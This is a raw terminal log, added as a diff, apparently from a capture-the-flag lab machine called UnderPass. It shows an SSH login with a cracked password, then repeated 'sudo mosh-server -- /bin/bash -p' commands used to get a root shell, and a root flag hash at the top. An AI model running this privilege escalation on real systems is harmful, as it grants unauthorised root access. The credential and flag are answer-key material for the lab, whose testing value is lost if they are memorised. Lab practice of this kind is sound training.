@@ -1,0 +1,153 @@
+underwaterfriends
+
+
+Root: fLAG: 
+6e732385bc271f20be1398ca063592aa
+Task Completed
+❯ ls
+ reports   md5.txt   passwd.txt   UnderPass
+❯ cat passwd.txt
+───────┬────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: passwd.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ underwaterfriends
+   2   │ 
+───────┴────────────────────────────────────────────────────────────────────────────────────────────
+❯ 
+❯ ssh svcMosh@10.10.11.48
+svcMosh@10.10.11.48's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Mar 29 10:37:54 PM UTC 2025
+
+  System load:  0.74              Processes:             228
+  Usage of /:   54.8% of 6.56GB   Users logged in:       1
+  Memory usage: 17%               IPv4 address for eth0: 10.10.11.48
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Mar 29 22:27:43 2025 from 10.10.16.84
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server —- /bin/bash -p
+Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server -- /bin/bash -p
+
+
+MOSH CONNECT 60001 hv0ZdU6OgZ9Su0ypIJ2fog
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 4818]
+svcMosh@underpass:~$ MOSH_KEY=8pmcVX3RWjo0o1VUP7emWA mosh-client 127.0.0.1 60001
+Error: Unknown terminal type.
+[mosh is exiting.]
+<_KEY=mw++=-FzFSACQP-[WEOQWP                 svcMosh@underpass:~$ [WEOQWP
+svcMosh@underpass:~$ 
+svcMosh@underpass:~$ 
+svcMosh@underpass:~$ 
+svcMosh@underpass:~$ 
+svcMosh@underpass:~$ LS
+LS: command not found
+svcMosh@underpass:~$ ls
+user.txt
+<mosh-client 127.0.0.1 60001                 <mosh-client 127.0.0.1 60001                 svcMosh@underpass:~                  
+<sh-server —- /bin/bash -p
+Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server -- /bin/bash -p                          
+
+
+MOSH CONNECT 60001 XdCKkn0bNbbfc62VUxa17A
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 4889]
+svcMosh@underpass:~$ MOSH_KEY=XdCKkn0bNbbfc62VUxa17A mosh-client 127.0.0.1 60001
+Error: Unknown terminal type.
+[mosh is exiting.]
+svcMosh@underpass:~$ MOSH_KEY=XdCKkn0bNbbfc62VUxa17A mosh-client 127.0.0.1 60001
+Error: Unknown terminal type.
+[mosh is exiting.]
+svcMosh@underpass:~$ MOSH_KEY=XdCKkn0bNbbfc62VUxa17A mosh-client 127.0.0.1 60001
+Error: Unknown terminal type.
+[mosh is exiting.]
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server —- /bin/bash -p                  
+Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server -- /bin/bash -p
+
+
+MOSH CONNECT 60001 u1RfnpwlBXbJb3r5fmiDNQ
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 4906]
+svcMosh@underpass:~$ MOSH_KEY=u1RfnpwlBXbJb3r5fmiDNQ mosh-client 127.0.0.1 60001
+Error: Unknown terminal type.
+[mosh is exiting.]
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server -- /bin/bash -p                  
+
+
+MOSH CONNECT 60002 ERtZjTxUK8NeqVZ91jXkQQ
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 4915]
+svcMosh@underpass:~$ su root
+Password: 
+su: Authentication failure
+svcMosh@underpass:~$ export TERM=xterm
+svcMosh@underpass:~$ 
+svcMosh@underpass:~$ sudo /usr/bin/mosh-server -- /bin/bash -p
+
+
+MOSH CONNECT 60001 WSLWRNPyRwlCge1QOvcp8A
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 4924]
+svcMosh@underpass:~$ echo 'export TERM=xterm' >> ~/.bashrc
+svcMosh@underpass:~$ source ~/.bashrc
+svcMosh@underpass:~$ 
+svcMosh@underpass:~$ MOSH_KEY=WSLWRNPyRwlCge1QOvcp8A mosh-client 127.0.0.1 60001
+[mosh is exiting.]
+svcMosh@underpass:~$ exit
+logout
+Connection to 10.10.11.48 closed.
+❯ ls
+ reports   md5.txt   passwd.txt   UnderPass
+
